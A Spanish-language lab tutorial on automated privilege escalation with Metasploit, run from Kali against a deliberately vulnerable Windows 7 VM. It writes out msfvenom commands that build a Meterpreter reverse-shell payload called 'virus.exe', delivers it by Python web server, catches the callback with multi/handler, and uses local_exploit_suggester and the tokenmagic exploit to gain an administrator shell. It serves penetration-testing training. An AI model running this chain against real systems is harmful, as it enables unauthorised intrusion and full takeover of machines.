# Escalada de Privilegios Automática con Metasploit en Linux & Windows

Maquinas que vamos a utilizar **Kali Linux y Windows 7 Vulnerable** [https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing)

Metasploit cuenta con un módulo realmente interesante que nos permite realizar una enumeración automática de exploits que podemos utilizar en la máquina objetivo para poder escalar privilegios.

- Vamos a hacer una intrusión en la Maquina Windows par poder empezar la escalada de privilegios.
    - Creamos un Payload con msfvenom .
        
        ```bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.3.4 LPORT=4444 -f exe -o virus.exe
        ```
        
        ![image.png](./imagenes/image%2087.png)
        
        `windows/meterpreter/reverser_tcp` como vemos estoy cargando una sesión de meterpreter por que si queremos escalar privilegios con metasploit es muy importante recibir un meterpreter.
        
        Si al ejecutar el payload recibimos un error que que la arquitectura de bits no es compatible esto es debido a que la maquina victima tiene una arquitectura de 64 o de 32 bits y esto habría que diferenciarlo. Esto lo solucionamos volviendo a crear el payload en 64 bits pero indicándole la arquitectura de esta manera:
        
        ```bash
        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.3.4 LPORT=4444 -f exe -o virus64.exe
        ```
        
- Montamos un servidor en Python desde el puerto 80
    
    ```bash
    python3 -m http.server 80
    ```
    
    ![image.png](./imagenes/image%2088.png)
    

- Vamos a cargar el virus.exe en la maquina victima a través del explorador web.
    
    ![image.png](./imagenes/image%2089.png)
    

- Abrimos el Metasploit para ponernos a la escucha con el **Multi/Handler**
    
    `use /multi/handler`
    
    ![image.png](./imagenes/image%2090.png)
    

`show options`

`set LHOST 10.0.3.4`

![image.png](./imagenes/image%2091.png)

- Ponemos el mismo Payload que hemos utilizado para el archivo virus. en mi caso
    
    **windows/x64/meterpreter/reverse_tcp**
    
    `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
    
    `run`
    
    ![image.png](./imagenes/image%2092.png)
    

- En la maquina Windows ejecutamos el archivo virus.exe o virus64.exe
    
    ![image.png](./imagenes/image%2093.png)
    

Y ya tenemos una sesión de meterpreter.

![image.png](./imagenes/image%2094.png)

---

Empezamos con la escalada de privilegios.

`background`

![image.png](./imagenes/image%2095.png)

<aside>
💡

`background` se usa para enviar una sesión activa de Meterpreter al segundo plano sin cerrarla. Esto nos permite seguir interactuando con la consola de Metasploit y ejecutar otros comandos mientras la sesión sigue activa en el sistema objetivo.

</aside>

- **Buscamos una opción que tiene Metasploit para automatizar la escalada de privilegios.**
    
    `search local_exploit_suggester`
    
    ![image.png](./imagenes/image%2096.png)
    
- Lo seleccionamos y miramos las opciones
    
    `use 0`
    
    ![image.png](./imagenes/image%2097.png)
    
    Nos pide el **SESSION** ID.
    
- Miramos el SESSION ID de la sesión que tengamos activa y que anteriormente hemos mandado a segundo plano con **background.**
    
    `sessions -l`
    
    ![image.png](./imagenes/image%2098.png)
    

- Le ponemos el numero de SESSION y y miramos que este todo bien
    
    `set SESSION 1`
    
    `show options`
    
    ![image.png](./imagenes/image%2099.png)
    

- Ejecutamos
    
    `run`
    
    ![image.png](./imagenes/image%20100.png)
    
    Nos recopila un montón de posibles exploit. Lo rojos debemos ignóralos y probar uno a uno los exploit de color verde.
    
    Para no eternizarnos adelanto que este exploit va a funcionar para esta maquina.
    
    `exploit/windows/local/tokenmagic`
    
    ![image.png](./imagenes/image%20101.png)
    

**La prueba de cada exploit se haría de la siguiente manera:**

`use exploit/windows/local/tokenmagic`

`show options`

![image.png](./imagenes/image%20102.png)

Rellenamos la información que nos pida y cambiamos LPORT por otro ya que el 4444 lo estamos utilizando en la sesión activa.

`set SESSION 1`

`set LHOST 10.0.3.4`

`set LPORT 5555`

![image.png](./imagenes/image%20103.png)

Ejecutamos y nos crea otra sesión de meterpreter como usuario administrador

`run`

![image.png](./imagenes/image%20104.png)

Lanzamos un Shell y miramos que usuario soy

`shell`

`whoami`

![image.png](./imagenes/image%20105.png)